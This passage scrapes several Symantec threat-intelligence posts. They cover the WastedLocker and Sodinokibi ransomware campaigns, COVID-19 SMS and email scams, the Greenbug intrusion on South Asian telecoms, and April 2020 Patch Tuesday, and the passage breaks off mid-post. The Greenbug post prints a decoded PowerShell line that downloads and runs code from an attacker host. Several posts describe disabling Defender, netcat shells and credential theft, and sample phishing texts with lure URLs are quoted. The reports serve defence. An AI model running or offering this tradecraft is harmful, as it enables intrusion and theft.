(returning all Windows Server, Windows Server 2003, or Windows 7 instances). The attackers then logged this information in a .tmp file. Privilege escalation was performed usinga publicly documented techniqueinvolving the Software Licensing User Interface tool (slui.exe), a Windows command line utility that is responsible for activating and updating the Windows operating system. The attackers used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers, such as adding a new user or executing additional downloaded PowerShell scripts. Cobalt Strike was also used to carry out credential dumping using ProcDump and to empty log files. In order to deploy the ransomware, the attackers use the Windows Sysinternals tool PsExec to launch a legitimate command line tool for managing Windows Defender (mpcmdrun.exe) to disable scanning of all downloaded files and attachments, remove all installed definitions, and, in some cases, disable real-time monitoring. It is possible that the attackers use more than one technique to perform this task, since NCC reported suspected use of a tool called SecTool checker for this purpose. PsExec is then used to launch PowerShell which uses the win32_service WMI class to retrieve services and the net stop command to stop these services. After Windows Defender is disabled and services have been stopped across the organization, PsExec is used to launch the WastedLocker ransomware itself, which then begins encrypting data and deleting shadow volumes. The attackers behind this threat appear to be skilled and experienced, capable of penetrating some of the most well protected corporations, stealing credentials, and moving with ease across their networks. As such, WastedLocker is a highly dangerous piece of ransomware. A successful attack could cripple the victim’s network, leading to significant disruption to their operations and a costly clean-up operation. The following protections are in place to protect customers against WastedLocker attacks and associated activity: File-based protection Note: C&C domains linked to this activity have been reported by Symantec to the relevant registrar. We would like to thank Namecheap for their assistance in suspending some domains associated with this attack. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/wastedlocker-ransomware-us"
  },
  {
    "title": "sodinokibi ransomware cobalt strike pos",
    "content": "Researchers at Symantec, a division of Broadcom (NASDAQ: AVGO), have spotted a Sodinokibi targeted ransomware campaign in which the attackers are also scanning the networks of some victims for credit card or point of sale (PoS) software. It is not clear if the attackers are targeting this software for encryption or because they want to scrape this information as a way to make even more money from this attack. The attackers are using the Cobalt Strike commodity malware to deliver the Sodinokibi targeted ransomware to victims. Eight organizations had the Cobalt Strike commodity malware on their systems, with three of the victims subsequently infected with the Sodinokibi ransomware. The victims infected with Sodinokibi were in the services, food, and healthcare sectors. The companies targeted in this campaign were primarily large, even multinational, companies, which were likely targeted because the attackers believed they would be willing to pay a large ransom to recover access to their systems. The attackers are aiming to make a lot of money - for victims infected with Sodinokibi the ransom requested is $50,000 in the Monero cryptocurrency if paid within the first three hours, and $100,000 after that. The attackers leverage legitimate tools in these attacks, and at one point we observed a legitimate remote admin client tool by NetSupport Ltd being used to install components during these attacks. In April, Symantec threat researchers found evidence of Sodinokibi attackers using similar tactics, when they spotted them using a copy of the AnyDesk remote access tool to deliver malware and other tools in at least two attacks. The attackers in this campaign also use ‘legitimate’ infrastructure to store their payload and for their command and control (C&C) server. The attackers are using code-hosting service Pastebin to host their payload (the Cobalt Strike malware and Sodinokibi) and are using Amazon’s CloudFront service for their C&C infrastructure, to communicate with victim machines. Pastebin and CloudFront are both legitimate services but have been observed being exploited by bad actors for similar malicious activity in the past. The advantage for malicious actors of using legitimate services to host payloads and for their C&C infrastructure is that traffic to and from a legitimate service is more likely to blend in with an organization’s legitimate traffic, and so is less likely to be flagged as suspicious and blocked. Cobalt Strike is an off-the-shelf tool that can be used to load shellcode onto victim machines; it has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors. The tactics used in this series of attacks are similar to tactics seen used in other targeted ransomware attacks before. Microsoft releasedresearchin April into attacks by six ransomware gangs, including Sodinokibi, and said that many of the groups employ similar tactics. The vector for most attacks observed by Microsoft was either the exploitation of vulnerable network devices or brute-force attacks on Remote Desktop Protocol (RDP) servers, and initial intrusion was followed by the use of living-off-the-land and commodity tools to perform credential theft and lateral movement before deploying the ransomware payload on multiple computers. So the tactics employed in this attack campaign are tactics commonly used by targeted ransomware gangs. Once on a network, the attackers take various steps to reduce the chance they will be detected and to increase the chances of their attack working. The attackers attempt to disable any security software on the machine so their activity can’t be detected. They also enable remote desktop connections so they can use them to launch malicious commands. The attackers also appear to be interested in stealing credentials on victim machines, and are observed adding user accounts, presumably in an attempt to maintain persistence on victim machines and also in a further attempt to keep a low profile on victim networks. We see the attackers using encoded PowerShell commands in some of these attacks. PowerShell is a Windows command line tool that has many legitimate purposes but is also frequently abused for nefarious purposes by malicious actors using living-off-the-land tactics. We see the Sodinokibi ransomware deployed on three of the victims that were infected with Cobalt Strike. Sodinokibi is a targeted ransomware - we saw targeted ransomware attacks increase by 62 percent in 2019, and targeted ransomware is one of the biggest threats on the cyber security landscape currently. Sodinokibi (aka REvil) first appeared in April 2019, but the actors behind it are widely believed to be the same actors who operated the GandCrab ransomware. GandCrab was a highly active targeted ransomware that first appeared in 2018. However, in June 2019 its operatorsannounced that they were ‘retiring’, claiming that they had made more than $2 billion from the ransomware. However, it’s widely thought that they simply turned their focus to the Sodinokibi ransomware instead. Sodinokibi was originally believed to be operated by one group but it is now thought to operate as a ransomware-as-a-service (RaaS), where one group maintains the code and rents it out to other groups, known as affiliates, who carry out attacks and spread the ransomware. Any profits made are then split between the affiliates and the original gang. Since it appeared on the scene, Sodinokibi has been one of the most prolific targeted ransomware strains and has been seen in numerous high-profile incidents. Actors using Sodinokibi were apparently responsible for thehack of foreign exchange service Travelexon New Year’s Eve. The attack left the company offline for almost a month and caused huge disruption to its business, according to public reports. The attackers were said to have demanded a ransom of $6 million in that incident, with Travelex reportedlyeventually paying $2.3 millionto regain access to its systems. In January, it was reported that Sodinokibi’saverage ransom demand was $260,000, so this was a huge ransom. Sodinokibi hit several other high-profile companies in the last year and, similar to the Maze ransomware group, announced in December 2019 that it would release data stolen from victims if its ransom demands weren’t met. Since that announcement, the gang has been observed offering the data of victims for sale on hacking forums, and at the beginning of Junean auction site was launchedwhere the group said it will sell off stolen data to the highest bidder. The three victims that were infected with Sodinokibi in this campaign were in the services, food, and healthcare sectors. The food and the services companies that were infected were both large, multi-site organizations that were likely capable of paying a large ransom - the type of company that would typically be targeted with Sodinokibi. However, the healthcare organization appears to have been a smaller operation. Interestingly, this victim’s systems were also scanned by the attackers for PoS software. It may be that the attackers realized this business might not be in a position to pay the large ransoms usually demanded in a Sodinokibi attack, and so scanned for PoS software to determine if they could profit from the compromise in another way, or they may have been scanning for this kind of software simply to encrypt it too. The attackers requested that the ransom be paid in the Monero cryptocurrency, which is favored for its privacy as, unlike Bitcoin, you cannot necessarily track transactions. For this reason we do not know if any of the victims paid the ransom, which was $50,000 if paid in the first three hours, rising to $100,000 after that time. While many of the elements of this attack are ‘typical’ tactics seen in previous attacks using Sodinokibi, the scanning of victim systems for PoS software is interesting, as this is not typically something you see happening alongside targeted ransomware attacks. It will be interesting to see if this was just opportunistic activity in this campaign, or if it is set to be a new tactic adopted by targeted ransomware gangs. One thing that is clear is the actors using Sodinokibi are sophisticated and skilled and show no sign that their activity is likely to decrease anytime soon. The companies targeted with this ransomware tend to be large corporate organizations, so companies like this need to be aware of the threat posed by this kind of activity. Trojan.Agentemis (aka Cobalt Strike) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/sodinokibi-ransomware-cobalt-strike-pos"
  },
  {
    "title": "threat landscape q1 2020",
    "content": "Towards the end of the first quarter of 2020, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out. From COVID-19-themed malicious email and BEC scams to vulnerability exploits and IoT attacks, let’s take a quick look at the trends that shaped the cyber security threat landscape in the first three months of 2020. While news of the coronavirus pandemic began to circulate in December 2019, it was March 2020 before the subject began to be used noticeably as a lure in malware-bearing emails. In February, Symantec, a division of Broadcom (NASDAQ: AVGO), blocked approximately 5,000 malicious emails with “coronavirus”, “corona”, or “COVID-19” in the subject line. However, in March this number increased significantly to roughly 82,000. More information on this trend can be found in our blogCOVID-19 Outbreak Prompts Opportunistic Wave of Malicious Email Campaigns. According to the FBI, business email compromise (BEC) scams are the most damaging and effective type of cyber crime, accounting for over $1.77 billion in losses for victims last year. While the number of organizations targeted by BEC scams was down from Q4 2019 numbers, there were still almost 31,000 organizations targeted in Q1 2020. The number of unique websites compromised with formjacking code increased in Q1 2020 as more criminals vie for their share of this lucrative malicious activity. There were 7,836 websites compromised with formjacking code in Q1 2020, up from 7,663 the previous quarter. To learn more about formjacking, read our white paper:How Malicious JavaScript Code is Stealing User Data from Thousands of Websites Each Month A directory traversal vulnerability in Citrix Application Delivery Controller and Citrix Gateway (CVE-2019-19781) was disclosed on December 17, 2019. Patches for the flaw, which could permit a remote attacker to execute arbitrary code on vulnerable computers, were not rolled out until January 2020. There was a spike in exploit attempts for this vulnerability immediately after its disclosure, peaking in February with over 492,000 attempts blocked by Symantec (Web Attack: Citrix ADC RCE CVE-2019-19781). Microsoft’s first Patch Tuesday release of 2020 disclosed a serious vulnerability in Windows CryptoAPI (CVE-2020-0601), a core component of the Windows operating system that handles cryptographic operations. Hackers were again quick to incorporate this vulnerability into their attacks, with blocked exploit attempts (Web Attack: Microsoft Windows CVE-2020-0601) reaching almost 82,500 in January. Attempts to exploit these vulnerabilities were blocked by Symantec’s Intrusion Prevention System (IPS). After declining markedly in 2019, phishing increased significantly during the first quarter of 2020, accounting for 1 in every 4,200 emails. Phishing activity is now back up to near where it was during 2018. The availability of more sophisticated phishing kits on the cyber underground may be driving a renewed interest in this form of attack. Some of the increase may also be accounted for by the upsurge in COVID-19-themed email attacks. The number of attacks against Symantec IOT honeypots* was up 13 percent in Q1 compared to Q4 of 2019. *Symantec’s IOT honeypots emulate protocols used by virtually all IOT devices, such as routers, connected cameras, digital video recorders, and so on. However, the number of unique IP addresses performing IOT attacks fell by 14 percent in the same period, indicating that while IoT botnets may be more aggressive in performing attacks, their relative size has fallen. The top ten passwords used in attacks on IOT devices. Most of the credentials used by attackers are default or easily guessable. The largest amount of attacks originated from IP addresses located in the U.S. followed by China, Vietnam, Taiwan, and South Korea. Since attacks are carried out by botnets of infected IOT devices, these countries have the highest number of infected IOT devices. For the latest insights on threat intelligence visitSymantec Enterprise Blog/Threat Intelligence. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-q1-2020"
  },
  {
    "title": "sms phishing coronavirus",
    "content": "As with all major newsworthy events, it was inevitable that criminals would take advantage of the COVID-19 pandemic. Symantec, a division of Broadcom (NASDAQ: AVGO), has already published blogs detailing how spammers and scammers are using coronavirus-themed lures in theirmalicious email campaigns, and how maliciousAndroid apps are also exploiting the outbreak. However, a more direct method to target people, and one that is arguably more trusted by users, is via text (SMS) messages sent to mobile phones. With this in mind, we analyzed links contained within more than 3 million SMS messages from hundreds of thousands of mobile devices from around the world that use Symantec’s mobile security technologies.Symantec Endpoint Protection Mobile(SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence inSymantec WebPulse, part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. While malicious SMS messages often use URL shortening services to evade detection and hide destination URLs that would otherwise appear risky, our technologies follow the attack trail to the final URL destination. We first began monitoring and evaluating the risk of COVID-19 related SMS messages soon after news of the virus began circulating in December 2019. We observed the first high-risk SMS phishing attack using COVID-19 as bait on January 24, 2020, roughly around the same period as the virus began to receive more media coverage. Up until March, we observed very few incidents of SMS phishing attacks using COVID-19 as bait. From late January to early March, only 1 in 500 (0.2 percent) COVID-19 related SMS messages were rated as high risk. However, COVID-19 SMS messages sent by scammers followed the same trend line as the coronavirus outbreak, which was officially declared a pandemic in March 2020. The number of high-risk COVID-19 SMS messages quickly increased after this, and by the third week of March, roughly 1 in 20 (5 percent) messages were categorized as a phishing attack or other type of high-risk attack. We observed several types of COVID-19 related SMS phishing scams. The criminals behind these scams all use the same tactic; taking advantage of people’s fears and financial hardships during the global pandemic in order to lure them in. The following are just three examples of financial-themed SMS phishing scams that use COVID-19 related lures (Note: Symantec’s mobile security technologies do not collect user-identifying information from SMS messages): Message:(Notification - ALERT ) Dear client, Scotiabank is working with the Government to make the Emergency Covid-19 Benefits deposits easier. To complete your Benefit demand. Please visit  :   www.Scotia-0nline.com Included URL:www.Scotia-0nline.com Apparent sender:scotiainfoalerts@scotiabank.com Message:TD BANK: We doing an update due to COVID-19. Click to login. Included URL:https://client-7492703.online Apparent sender:+15197551999 Message:URGENT: UKGOV has issued a payment of 458 GBP to all residents as part of its promise to battle COVID 19. TAP here to apply Included URL:https://uk-covid-19.webredirect.org Apparent sender:covid It's no surprise that SMS related texts and scams follow the same trend lines of the COVID-19 outbreak. What is surprising, however, is the amount of time it took for the scammers to catch up. We observed a significant increase in the number of SMS phishing scams over the third week of March. Install a suitable security app, such asSymantec Endpoint Protection Mobile(SEP Mobile).SEP Mobile extends the power of WebPulse’s URL reputation to modern endpoints, ensuring they receive the same level of protection as traditional endpoints. Employees can safely access the web and apps on their mobile devices, without having to worry about false positives and productivity or latency issues, and organizations reduce the risk that devices will bring malware into the corporate network. Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/sms-phishing-coronavirus"
  },
  {
    "title": "greenbug espionage telco south asia",
    "content": "The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020. There are indications that at least one of the companies was first targeted as early as April 2019. Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and living-off-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it stealing credentials then testing connectivity to these servers using the stolen credentials. Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it wasnever clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems. Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization’s network prior to a wiping attack that involved W32.Disttrack.B (Shamoon’s malware). This link was never definitively established, but cooperation between the two groups is considered a possibility. Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, low-profile presence on victim networks. Across multiple victim machines, a file named proposal_pakistan110.chm:error.html was executed via an internet browser. We also see the same file being opened by archiver tools. While we were unable to retrieve the file for analysis, the same technique has been leveraged by Greenbug in the past, as early as 2016. In these earlier attacks, emails were sent to targets containing a link to a likely compromised site, which hosted an archive file. This archive contains a malicious CHM file (compiled HTML Help file), which includes an ADS (alternative data steam) to hide its payload, which is installed when executed. This file usually also contains a decoy PDF file containing an error message that says the file could not be opened correctly. We have also seen similarly named files used in other organizations in the past to drop Trojan.Ismdoor, Greenbug’s custom malware. Around the same time as we saw this file, a file called GRUNTStager.hta was also executed. Symantec believes the attackers used the publically availableCovenant post-exploitation frameworkin order to gain an initial foothold in their target organizations. Covenant is a publicly available hack tool that is described as “a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform.” It is described as being for use by “red teams,” but is also open to being abused by malicious actors. Greenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in gaining access to the organization’s database server. The attackers were observed executing various PowerShell commands on the victim system. The first activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a CobaltStrike Beacon module to download the next stage payload. We were able to extract two command and control (C&C) server addresses from the PowerShell command. Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via $PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious file hosted on the same previously mentioned C&C server. This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the attackers were also observed attempting to perform a download to CSIDL_APPDATA\\a8f4.exe via the bitsadmin utility The BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the compromised machine. A short time later, the attackers executed several tools from CSIDL_SYSTEM86\\[REDACTED] directory: The attackers were then seen launching PowerShell and attempting to execute a PowerShell script called msf.ps1. This command was executed several times and is likely used to install a Metasploit payload to retain access to the compromised machine. That is the last activity seen on that day. No further activity was observed until February 6, 2020, when a suspicious PowerShell command was executed. The PowerShell command follows the execution of the w3wp.exe process – an application that is used to serve requests to a web application. This may indicate that the attackers have used a webshell on the compromised machine. The following is a copy of the PowerShell command executed by the attackers: This command is used to search for files similar to web.config. For each file found, it extracts username and password information where possible, decrypting it using theaspnet_regiis.exeutility. These credentials may be used to access organizational resources such as SQL servers. Further activity was seen on February 12 and February 14. On February 12, the attackers returned and executed a tool:pls.exe. An hour later, the attackers bound cmd.exe to a listening port usingnetcatwith the following command: The same command was issued again about 20 minutes later. Two days later, at 7.29am local-time, the attackers returned and connected to the listening port, launching cmd.exe. They issued the following commands: The next day (February 15) the attackers returned to the command prompt and issued a command to add a user and then checked that the user was added. No further activity was observed until March 4, when a PowerShell command was launched at 6.30pm local time. A WMI command was also observed being executed and used to search for a specific account. Shortly after this, the well-known credential-stealing tool Mimikatz was executed from %USERPROFILE%\\documents\\x64. On March 11, the attackers attempted to connect to a database server via PowerShell, presumably using credentials they had stolen. The attackers also used an SQL command to retrieve the version information of the database server, presumably to test the credentials and connectivity. Further activity was seen in April. On April 8, suspicious PowerShell commands were observed attempting to download tools from a remote host. That was the only activity seen on April 8, then on April 13 PowerShell was launched and the following commands were observed being executed: Next, PowerShell was used to connect to a database server and check the version information, likely to confirm working credentials. This is similar to the previous PowerShell command observed with the exception of a different database server IP address. Finally, the attackers used PowerShell to view the current ARP table (IPs and hostname of machines that have recently been communicated with) via an arp -a command. That is the last activity we observed on this machine. A number of suspicious files were found on this machine (see IoCs). The files include the Covenant tool and Mimikatz, as already mentioned, as well as Cobalt Strike, an off-the-shelf tool that can be used to load shellcode onto victim machines, and multiple webshells. We saw suspicious activity on various machines on this same victim’s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker’s infrastructure. On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the files executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access to an internal machine. Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before, includingby Iranian actors earlier this year. Plink was also seen on a second machine in this organization, which appears to have been compromised from November 2019 up to April 2020. The first suspicious activity on this machine was seen on November 13, when PowerShell Remoting was enabled on the machine to allow it to receive PowerShell commands. A PowerShell command was used to download a file from attacker controlled infrastructure and launch it with a specific argument. The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a connection to the victim network. A second PowerShell command was then executed as follows: The encoded argument decodes to the following: The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands were executed on the machine about a week later, on November 16. The first decodes to the following: iex ((New-Object Net.WebClient).DownloadString('http://apps[.]vvvnews.com:8080/Default.htt')) As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP addresses. This was likely done as a means to evade detection. Greenbug’s activity in this campaign seems to make it clear that its main focus with these victims is to steal credentials, and to maintain a low profile on the victim’s network so the attackers can remain on it for a substantial period of time. This is typical of the activity we have seen in Greenbug victims in the past, with maintaining persistence on a victim network appearing to be one of the group’s primary goals. Greenbug has also been observed targeting telecoms companies in this same region in previous attack campaigns. The setting up of tunnels shows how important keeping a low-profile is for this group. Its focus on stealing credentials, and on establishing connections with database servers, shows that it is aiming to achieve a high level of access to a victim’s network - access that if exploited could cause havoc on a compromised network very quickly. This level of access, if leveraged by actors using disruptive malware or ransomware, could shut down an organization’s entire network very quickly. Previous victims of Greenbug have included organizations in the aviation, government, investment, and education sectors, as well as the telecoms sector, with attacks against telecoms organizations in the Middle East in 2017. In 2019, we observed 18 nation-state backed groups targeting the telecoms sector worldwide, so it seems to be an area of interest for sophisticated actors recently. It is probably not too hard to understand why the telecommunications industry, made up of phone providers and internet service providers (ISPs), is attractive to APT groups, whose main motivation is most often intelligence gathering. The access to calls, communications logs, and messages offered by telecoms companies makes them hugely valuable targets for these attackers. We can only speculate about Greenbug’s motives for targeting these specific telecoms companies, but it is clear that comprehensive and persistent access to victim networks remains the key priority for this group. Symantec products protect against threats discussed in this blog with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"
  },
  {
    "title": "covid 19 text scam",
    "content": "This is a follow-up to our previous blog onCOVID-19 related spam campaigns. This blog will share some insight on the latest wave of COVID-19 themed spam campaigns and how Email Threat Isolation (ETI) from Symantec stops these emails from accomplishing their goals. Symantec has continued to observe numerous malicious email campaigns taking advantage of the global panic surrounding the coronavirus outbreak. While we previously discussed malspam (malware bearing) emails, now a wave of text-based spam campaigns have emerged. These emails do not contain any malicious attachments and instead rely on what is written in the email to trick users into handing over information or money. According to Symantec telemetry, as well as COVID-19 related phishing and malspam campaigns, spammers are increasingly using text-based campaigns. One reason for this is that it is comparatively cheaper and easier than phishing and malspam campaigns as there is no need for compromised domains or malware. The most abused vanity TLDs used in these campaigns are .xyz, .top, and .site. These text-based spam campaigns include the following types of scams: One of the best solutions or defense mechanisms provided by Symantec to its customers is Email Threat Isolation (ETI). ETItechnology checks emails and attachments for phishing URLs or malicious content hosted on them. This technology de-risks the threat scenario by providing an extra layer of protection that allows users to safely browse unknown or shady websites, without risk of malware infection or credential theft. ETI is offered within the Symantec Email Security.cloud and Symantec Messaging Gateway solutions, and also as a standalone product that works with email security solutions from other vendors. Phishing emails masquerading as COVID-19 funding reports are being spread in spam campaigns. These emails try their best to trick recipients into clicking on links that lead to phishing web pages designed to steal credentials. Threat actors have designed convincing email templates that appear to come from reputable file-sharing/storage services and use them for their phishing campaigns. An example of this can be seen in Figure 2. The email content is kept short and mentions that a confidential document has been shared with the email recipient. In order to view the “Confidentiality.pdf” file, the user needs to click on “OPEN FILE”, beneath which a recently registered domain is used to form a phishing URL: https://[REMOVED]covid.com/ The phishing URL opens as a legitimate looking login page requesting the user to enter credentials. In Figure 3, Email Threat Isolation (ETI) alerts the user that the web page is potentially unsafe to visit and automatically enables the protected view with read-only mode. This helps to safeguard the user’s credentials or confidential information from being compromised. In Figure 4, a bogus email template is used to tell the recipient that a COVID-19 report file has been shared with them. When the “View” button is clicked, the user is brought to a phishing web page constructed with the help of a compromised domain: https://[REMOVED]/ssl/?@= These emails claim to come from small to medium-sized manufacturing firms, offering for sale a variety of medical equipment. The email templates used are kept simple and direct. As with many of these scam emails, there are often grammar, spelling, and punctuation errors present. In Figure 5, the threat actor provides a list of medical equipment specifying the type of respirators and masks available for purchase. The email also mentions that special chartered shipping services are available for VIP clients and provides shipping details. In Figure 6, the threat actor poses as a supplier from China keen to ship various types of face masks to different parts of the world with abundant stock ready to ship. This is another variation of the infamous advance fee scam. These emails are generally kept short and try to attract victims by offering generous monetary donations. In Figure 7, a generous wealthy couple is supposedly donating money for the Covid-19 relief effort. The email asks the recipient to provide personal details to a lawyer in order to claim the money. The email shown in Figure 8 is supposedly from the United Nations, in relation to COVID-19 relief. The email asks the recipient to verify their email address, which will then allow the sender to begin a conversation with the user and begin their scam. The subject line of this email starts with “Re:”, a tactic used to trick the recipient into thinking the message is a continuation of previous correspondence. These emails are themed as notification emails notifying the user they have been selected in a lottery to receive coronavirus compensation. In Figure 9, one of these emails asks the user to provide personal information before applying for their share of $1,000,000. These emails leverage cryptocurrencies and QR codes. The email shown in Figure 10 presents the recipient with a Bitcoin wallet address and a QR code to supposedly donate money or “food gift cards” to help with the coronavirus pandemic relief effort. Scanning the QR code brings up the same Bitcoin wallet listed in the email text. The email also lists an email address where all gift cards should be forwarded to. In Figure 11, the threat actor poses as a doctor and urges recipients to donate funds towards the COVID-19 Solidarity Response Fund, which will supposedly help with the production of a COVID-19 vaccine. Donations are requested to be paid to the provided Bitcoin wallet address. Snowshoe campaigns continue to be a firm favorite for spammers. These campaigns appear with heavy randomization in header fields to avoid detection. Snowshoe campaigns come in large batches in a short period of time. Along with heavy randomization of email features, these runs also use a myriad of topics and themes. In addition, these emails are distributed with a variety of originating IP addresses, domains with different gTLDs, and heavy obfuscation to avoid detection. In Figures 12 and 13, threat actors have made use of current affairs and designed their email templates accordingly. These include themes like “Elon Musk Reveals How to Profit from Coronavirus” and the promotion of a “Touch Free Body Thermometer.” Ultimately, the URLs hyperlinked beneath the words “Register now!” and “Browse Thermometers” contain newly registered spam domains. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering systems, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale. At Symantec, response teams strive hard to protect our valuable customers by introducing new defense mechanisms against such challenging attacks. An array of defense mechanisms is deployed in different layers at .cloud and Symantec Mail gateway level to block similar attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/covid-19-text-scam"
  },
  {
    "title": "microsoft patch tuesday april 2020",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the April 2020 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: 1.Cumulative Security Updates for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2020-0969)MS Rating: Critical A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge (HTML-based)L. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0968)MS Rating: Critical A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0970)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. VBScript Remote Code Execution Vulnerability(CVE-2020-0967)MS Rating: Critical A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2020-0895)MS Rating: Important A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. VBScript Remote Code Execution Vulnerability(CVE-2020-0966)MS Rating: Important A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. 2.Cumulative Security Updates for Microsoft Office Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2020-0974)MS Rating: Critical A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2020-0929)MS Rating: Critical A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2020-0931)MS Rating: Critical A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2020-0932)MS Rating: Critical A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft Excel Remote Code Execution Vulnerability(CVE-2020-0906)MS Rating: Important A remote code execution vulnerability exists in Microsoft Excel software when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. Microsoft Excel Remote Code Execution Vulnerability(CVE-2020-0979)MS Rating: Important A remote code execution vulnerability exists in Microsoft Excel software when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2020-0961)MS Rating: Important A remote code execution vulnerability exists when the Microsoft Office Access Connectivity Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Microsoft Office Remote Code Execution Vulnerability(CVE-2020-0760)MS Rating: Important A remote code execution vulnerability exists when Microsoft Office improperly loads arbitrary type libraries. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0923)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0924)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft 